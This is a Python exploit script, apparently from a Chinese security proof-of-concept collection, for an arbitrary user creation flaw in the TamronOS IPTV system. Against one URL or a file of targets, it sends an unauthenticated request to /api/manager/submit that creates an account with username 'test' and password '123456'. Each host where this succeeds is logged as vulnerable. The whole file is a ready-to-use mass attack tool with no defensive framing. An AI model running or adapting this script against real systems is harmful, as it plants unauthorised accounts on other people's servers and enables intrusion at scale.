import requests
import argparse
import urllib3
import sys

urllib3.disable_warnings()


def title():
    print("""
                               TamronOS_IPTV系统_submit_任意用户创建漏洞
                      use: python3  TamronOS_IPTV系统_submit_任意用户创建漏洞.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        try:
            requests.packages.urllib3.disable_warnings()
            web = requests.get(self.url + "/api/manager/submit?group=1&username=test&password=123456", verify=False)
            if 'true' in web.text and web.status_code == 200:
                print(self.url + "存在TamronOS_IPTV系统_submit_任意用户创建漏洞洞！")
                with open("TamronOS_IPTV系统_submit_任意用户创建漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            else:
                print("\033[31m[x] " +self.url+"不存在TamronOS_IPTV系统_submit_任意用户创建漏洞 \033[0m")
        except requests.exceptions.ConnectionError:
            print("链接错误")
            pass


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="TamronOS_IPTV系统_submit_任意用户创建漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 TamronOS_IPTV系统_submit_任意用户创建漏洞.py -u http://127.0.0.1\neg2:>>>python3 TamronOS_IPTV系统_submit_任意用户创建漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
